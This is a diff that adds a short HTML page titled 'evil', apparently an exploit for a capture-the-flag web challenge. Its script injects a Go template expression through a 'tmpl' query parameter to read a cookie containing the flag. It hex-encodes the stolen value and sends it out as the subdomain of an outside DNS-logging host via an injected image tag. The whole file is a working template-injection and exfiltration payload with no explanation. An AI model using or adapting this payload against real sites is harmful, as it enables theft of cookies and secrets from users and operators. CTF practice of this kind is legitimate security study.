@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>evil</title>
+<body>
+<script>
+    (async function evil() {
+        await fetch('/flag');
+        const res = await fetch('/?tmpl={{.Cookie (.Query .RemoteIP)}}&127.0.0.1=flag');
+        const flag = [...await res.text()].map(a=>a.charCodeAt(0).toString(16)).join('');
+        document.body.innerHTML+=`<img src="http://${flag}.0exrvcq9.dnslog.pw">`
+    })();
+</script>
+</body>
+</html>
